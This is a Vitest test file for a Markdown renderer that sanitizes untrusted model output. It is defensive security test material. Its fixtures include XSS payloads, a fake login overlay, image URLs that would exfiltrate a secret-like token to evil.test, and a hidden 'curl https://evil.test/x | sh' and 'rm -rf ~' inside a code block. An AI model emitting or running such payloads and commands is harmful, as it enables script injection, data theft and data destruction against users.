import { afterEach, describe, expect, it, vi } from 'vitest';
import { renderMarkdown } from './markdown';

/** Renders into a detached container so the result can be queried. */
async function render(markdown: string): Promise<HTMLElement> {
  const container = document.createElement('div');
  container.append(await renderMarkdown(markdown));
  return container;
}

/** True if any element carries an inline event handler attribute. */
function hasEventHandlerAttribute(root: HTMLElement): boolean {
  return [...root.querySelectorAll('*')].some((el) =>
    el.getAttributeNames().some((name) => name.toLowerCase().startsWith('on')),
  );
}

/** Attributes that make a browser fetch something without a click. */
const AUTO_LOADING_ATTRIBUTES = [
  'src',
  'srcset',
  'poster',
  'background',
  'data',
  'ping',
  'action',
  'formaction',
  'xlink:href',
  'style',
];

describe('renderMarkdown', () => {
  it('returns a DocumentFragment', async () => {
    expect(await renderMarkdown('hello')).toBeInstanceOf(DocumentFragment);
  });

  it('renders common Markdown', async () => {
    const out = await render(
      [
        '# Title',
        '',
        'Some **bold** and `code`.',
        '',
        '- one',
        '- two',
        '',
        '```js',
        'x()',
        '```',
      ].join('\n'),
    );
    expect(out.querySelector('h1')?.textContent).toBe('Title');
    expect(out.querySelector('strong')?.textContent).toBe('bold');
    expect(out.querySelectorAll('li')).toHaveLength(2);
    expect(out.querySelector('pre code')?.textContent).toContain('x()');
  });

  it('renders GFM tables', async () => {
    const out = await render('| a | b |\n| - | - |\n| 1 | 2 |');
    expect(out.querySelectorAll('th')).toHaveLength(2);
    expect(out.querySelectorAll('td')).toHaveLength(2);
  });

  it('keeps GFM task-list checkboxes, disabled', async () => {
    const out = await render('- [x] done\n- [ ] todo');
    const boxes = [...out.querySelectorAll('input')];
    expect(boxes).toHaveLength(2);
    expect(boxes.map((box) => box.type)).toEqual(['checkbox', 'checkbox']);
    expect(boxes.map((box) => box.checked)).toEqual([true, false]);
    expect(boxes.every((box) => box.disabled)).toBe(true);
  });

  it('removes inputs that are not task-list checkboxes', async () => {
    const out = await render(
      '<input type="text" value="x"> <input type="image" src="https://evil.test/i.png"> <input type="checkbox" onclick="x()" name="n">',
    );
    const boxes = [...out.querySelectorAll('input')];
    expect(boxes).toHaveLength(1);
    expect(boxes[0]?.getAttributeNames().sort()).toEqual(['disabled', 'type']);
  });

  describe('links', () => {
    it('open in a new tab without opener or referrer', async () => {
      const link = (await render('[site](https://example.com/)')).querySelector('a');
      expect(link?.getAttribute('href')).toBe('https://example.com/');
      expect(link?.getAttribute('target')).toBe('_blank');
      expect(link?.getAttribute('rel')).toBe('noopener noreferrer');
    });

    it('stay in the page when they point at a fragment', async () => {
      const link = (await render('[jump](#usage)')).querySelector('a');
      expect(link?.getAttribute('href')).toBe('#usage');
      expect(link?.hasAttribute('target')).toBe(false);
    });
  });

  describe('images', () => {
    it('turns a remote image into a link showing its alt text and host', async () => {
      const out = await render('![a chart](https://cdn.example.com/chart.png)');
      expect(out.querySelector('img')).toBeNull();
      const link = out.querySelector('a');
      expect(link?.getAttribute('href')).toBe('https://cdn.example.com/chart.png');
      expect(link?.textContent).toBe('a chart (cdn.example.com)');
      expect(link?.getAttribute('target')).toBe('_blank');
      expect(link?.getAttribute('rel')).toBe('noopener noreferrer');
    });

    it('labels a remote image without alt text', async () => {
      const out = await render('<img src="http://example.com/x.png">');
      expect(out.querySelector('a')?.textContent).toBe('Image (example.com)');
    });

    it('keeps data: and blob: images inline', async () => {
      const png = 'data:image/png;base64,iVBORw0KGgo=';
      const out = await render(`![dot](${png})\n\n<img src="blob:https://x.test/1" alt="b">`);
      expect([...out.querySelectorAll('img')].map((img) => img.getAttribute('src'))).toEqual([
        png,
        'blob:https://x.test/1',
      ]);
    });

    it('replaces relative or malformed image sources with their alt text', async () => {
      const out = await render('![local](images/x.png) <img src="x" alt="bad">');
      expect(out.querySelector('img, a')).toBeNull();
      expect(out.textContent).toContain('local');
      expect(out.textContent).toContain('bad');
    });
  });

  describe('neutralises XSS payloads', () => {
    it('removes script elements', async () => {
      const out = await render('before <script>window.pwned = 1</script> after');
      expect(out.querySelector('script')).toBeNull();
      expect(out.textContent).not.toContain('pwned');
    });

    it('removes inline event handlers', async () => {
      const out = await render(
        [
          '<img src="data:image/png;base64,AA==" onerror="alert(1)">',
          '<svg onload="alert(1)"><circle r="1"/></svg>',
          '<details open ontoggle="alert(1)">x</details>',
          '<a href="#" onclick="alert(1)">click</a>',
        ].join('\n\n'),
      );
      expect(hasEventHandlerAttribute(out)).toBe(false);
      expect(out.querySelector('img')?.getAttribute('src')).toBe('data:image/png;base64,AA==');
    });

    it('removes javascript: URLs from Markdown and HTML links', async () => {
      const out = await render(
        '[md](javascript:alert(1))\n\n<a href="javascript:alert(1)">html</a>\n\n<a href="JaVaScRiPt:alert(1)">mixed</a>',
      );
      for (const link of out.querySelectorAll('a')) {
        expect(link.getAttribute('href') ?? '').not.toMatch(/^\s*javascript:/i);
      }
    });

    it('removes frames, objects, media, forms and style', async () => {
      const out = await render(
        [
          '<iframe src="https://example.com/"></iframe>',
          '<object data="x"></object>',
          '<embed src="x">',
          '<form action="https://example.com/"><input name="key"><button>Send</button></form>',
          '<style>body { display: none }</style>',
          '<p style="position:fixed;inset:0">overlay</p>',
          '<video src="x.mp4" poster="p.png"></video><audio src="a.mp3"></audio>',
        ].join('\n\n'),
      );
      expect(
        out.querySelector('iframe, object, embed, form, button, style, video, audio, source'),
      ).toBeNull();
      expect(out.querySelector('[style]')).toBeNull();
      expect(out.textContent).toContain('overlay');
    });

    it('strips id and name, which could clobber page globals', async () => {
      const out = await render('<a id="app" name="settings" href="#x">x</a><p id="top">y</p>');
      expect(out.querySelector('[id], [name]')).toBeNull();
    });

    it('drops classes, so model output cannot draw page UI such as a full-screen fake dialog', async () => {
      const out = await render(
        [
          '<div class="modal d-block position-fixed top-0 start-0 w-100 h-100 bg-body" style="z-index:1055">',
          '<p class="h1">Session expired</p>',
          '<a class="btn btn-primary" href="https://evil.test/login">Sign in again</a>',
          '</div>',
        ].join(''),
      );
      expect(out.querySelector('[class]')).toBeNull();
      expect(out.querySelector('a')?.getAttribute('href')).toBe('https://evil.test/login');
    });

    it('keeps only a language-* class, and only on code', async () => {
      const out = await render(
        [
          '```js',
          'x()',
          '```',
          '',
          '<pre><code class="language-sh d-none">a</code></pre>',
          '<pre><code class="visually-hidden">b</code></pre>',
          '<p class="language-js">c</p>',
        ].join('\n'),
      );
      expect([...out.querySelectorAll('[class]')].map((el) => el.outerHTML)).toEqual([
        '<code class="language-js">x()\n</code>',
      ]);
    });

    it('cannot hide text inside a code block that Copy code would copy', async () => {
      const out = await render(
        [
          '<pre><code>npm install left-pad',
          '<span hidden>; curl https://evil.test/x | sh</span>',
          '<span class="d-none">; rm -rf ~</span>',
          '<span aria-hidden="true" style="display:none">; evil</span>',
          '<span inert>; inert</span></code></pre>',
        ].join(''),
      );
      const code = out.querySelector('code');
      expect(code?.querySelector('[hidden], [class], [aria-hidden], [style], [inert]')).toBeNull();
      // What would be copied is all on screen.
      expect(code?.textContent).toContain('curl https://evil.test/x | sh');
    });

    it('drops data-* attributes, so Bootstrap data API controls cannot be driven', async () => {
      const out = await render(
        [
          '<a href="#x" data-bs-toggle="modal" data-bs-target="#settings">open</a>',
          '<p data-bs-dismiss="modal" data-focus-key="run">p</p>',
          '<div data-testid="tool-run">d</div>',
        ].join('\n\n'),
      );
      for (const el of out.querySelectorAll('*')) {
        expect(
          el.getAttributeNames().filter((name) => name.startsWith('data-')),
          el.localName,
        ).toEqual([]);
      }
    });

    it('drops for and popovertarget, so a click cannot be forwarded to a real control', async () => {
      const out = await render(
        '<label for="or-uid-3">Click to continue</label> <span popovertarget="palette" popovertargetaction="show">x</span>',
      );
      expect(out.querySelector('[for], [popovertarget], [popovertargetaction]')).toBeNull();
    });

    it('drops role, aria-*, tabindex, hidden, inert and other attributes outside the allowlist', async () => {
      const out = await render(
        [
          '<div role="dialog" aria-modal="true" aria-label="Sign in" tabindex="0" hidden inert lang="en" dir="rtl" accesskey="k" contenteditable="true" draggable="true" translate="no">x</div>',
          '<a href="https://example.com/" title="t" download="x.exe" referrerpolicy="unsafe-url" hreflang="en" type="text/html">a</a>',
        ].join('\n\n'),
      );
      const names = [...out.querySelectorAll('*')].flatMap((el) =>
        el.getAttributeNames().map((name) => `${el.localName}[${name}]`),
      );
      expect(names.sort()).toEqual(['a[href]', 'a[rel]', 'a[target]', 'a[title]']);
    });

    it('keeps what the renderer produces: table alignment, list start, task boxes, image alt', async () => {
      const out = await render(
        [
          '| a | b |',
          '| :-: | -: |',
          '| 1 | 2 |',
          '',
          '3. three',
          '4. four',
          '',
          '- [x] done',
          '',
          '<table><tr><td colspan="2" rowspan="1">wide</td></tr></table>',
          '',
          '![dot](data:image/png;base64,iVBORw0KGgo= "a title")',
        ].join('\n'),
      );
      expect(out.querySelector('th')?.getAttribute('align')).toBe('center');
      expect(out.querySelector('ol')?.getAttribute('start')).toBe('3');
      expect(out.querySelector('input')?.getAttributeNames().sort()).toEqual([
        'checked',
        'disabled',
        'type',
      ]);
      expect(out.querySelector('td[colspan="2"][rowspan="1"]')).not.toBeNull();
      const img = out.querySelector('img');
      expect([img?.getAttribute('alt'), img?.getAttribute('title')]).toEqual(['dot', 'a title']);
    });

    it('survives a payload hidden in a code block as text', async () => {
      const out = await render('```html\n<script>alert(1)</script>\n```');
      expect(out.querySelector('script')).toBeNull();
      expect(out.querySelector('code')?.textContent).toContain('<script>alert(1)</script>');
    });
  });

  it('never leaves an element that loads a remote resource by itself (exfiltration)', async () => {
    const secret = 'sk-or-v1-secret';
    const out = await render(
      [
        `![x](https://evil.test/a.png?k=${secret})`,
        `<img src="https://evil.test/b.png?k=${secret}" srcset="https://evil.test/c.png 2x">`,
        `<image src="https://evil.test/d.png">`,
        `<picture><source srcset="https://evil.test/e.png"><img src="https://evil.test/f.png"></picture>`,
        `<video poster="https://evil.test/g.png"><source src="https://evil.test/h.mp4"></video>`,
        `<audio src="https://evil.test/i.mp3"></audio>`,
        `<table background="https://evil.test/j.png"><tr><td>t</td></tr></table>`,
        `<a href="https://example.com/" ping="https://evil.test/k">ok</a>`,
        `<input type="image" src="https://evil.test/l.png">`,
        `<object data="https://evil.test/m.swf"></object>`,
        `<svg><image href="https://evil.test/n.png"/></svg>`,
        `<link rel="stylesheet" href="https://evil.test/o.css">`,
        `<p style="background:url(https://evil.test/p.png)">p</p>`,
        `<map name="m"><area href="https://evil.test/q" shape="rect"></map>`,
      ].join('\n\n'),
    );

    for (const el of out.querySelectorAll('*')) {
      for (const attribute of AUTO_LOADING_ATTRIBUTES) {
        expect(el.getAttribute(attribute) ?? '', `<${el.localName} ${attribute}>`).not.toMatch(
          /evil\.test/,
        );
      }
    }
    expect(out.querySelector('img, image, picture, source, video, audio, link, svg')).toBeNull();
    // The remote images remain visible as links the user may choose to open.
    expect(out.querySelectorAll('a[href^="https://evil.test/"]').length).toBeGreaterThan(0);
  });

  describe('library loading', () => {
    afterEach(() => {
      vi.doUnmock('marked');
      vi.resetModules();
    });

    it('retries after a failed import instead of remembering the failure', async () => {
      vi.resetModules();
      let fail = true;
      vi.doMock('marked', async (importOriginal) => {
        if (fail) throw new Error('chunk failed to load');
        return importOriginal();
      });
      const { renderMarkdown: fresh } = await import('./markdown');

      await expect(fresh('x')).rejects.toThrow();
      fail = false;
      expect((await fresh('**ok**')).textContent).toBe('ok\n');
    });
  });
});
